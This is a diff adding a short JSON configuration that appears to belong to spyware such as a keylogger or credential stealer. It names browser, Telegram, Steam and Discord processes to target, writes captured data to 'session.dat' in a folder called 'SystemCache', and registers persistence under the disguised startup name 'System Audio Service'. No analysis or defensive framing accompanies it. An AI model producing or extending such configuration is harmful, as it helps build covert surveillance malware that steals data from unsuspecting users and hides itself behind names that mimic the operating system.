@@ -1,0 +1,13 @@
+{
+  "target_processes": [
+    "chrome.exe",
+    "telegram.exe",
+    "steam.exe",
+    "discord.exe",
+    "explorer.exe"
+  ],
+  "log_file_name": "session.dat",
+  "error_log_name": "errors.log",
+  "log_directory": "SystemCache",
+  "startup_name": "System Audio Service"
+}
